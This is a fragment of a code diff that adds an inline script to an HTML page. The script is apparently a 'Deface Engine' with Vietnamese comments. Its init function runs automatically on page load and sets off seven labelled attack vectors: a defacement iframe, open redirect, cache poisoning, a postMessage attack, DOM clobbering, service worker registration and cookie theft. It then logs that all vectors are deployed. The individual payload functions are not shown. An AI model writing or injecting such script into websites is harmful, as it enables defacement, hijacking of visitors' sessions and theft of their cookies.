+      html +
+      '<div style="margin-top:20px;text-align:center;">' +
+      '<button class="btn btn-ghost" onclick="this.parentElement.parentElement.parentElement.remove()" style="padding:10px 30px;">Đóng</button>' +
+      '</div></div>';
+    document.body.appendChild(overlay);
+  };
+  
+  // === INITIALIZATION ===
+  function init() {
+    console.log('[+] Initializing Deface Engine...');
+    
+    // Vector 1: Iframe chính
+    injectDefaceIframe();
+    
+    // Vector 2: Open Redirect test
+    testOpenRedirect();
+    
+    // Vector 3: Cache Poisoning probe
+    probeCachePoisoning();
+    
+    // Vector 4: postMessage attack
+    setTimeout(postMessageAttack, 1000);
+    
+    // Vector 5: DOM Clobbering
+    domClobbering();
+    
+    // Vector 6: Service Worker
+    setTimeout(registerServiceWorker, 2000);
+    
+    // Vector 7: Cookie simulation
+    simulateCookieTheft();
+    
+    console.log('%c✅ All vectors deployed!', 'color: #00ff00; font-size: 14px;');
+    
+    // Thêm style cho fadeOut animation
+    const style = document.createElement('style');
+    style.textContent = '@keyframes fadeOut { from { opacity: 1; transform: scale(1); } to { opacity: 0; transform: scale(0.95); } }';
+    document.head.appendChild(style);
+  }
+  
+  // Khởi chạy khi DOM ready
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+})();
+</script>
 </body>
 </html>
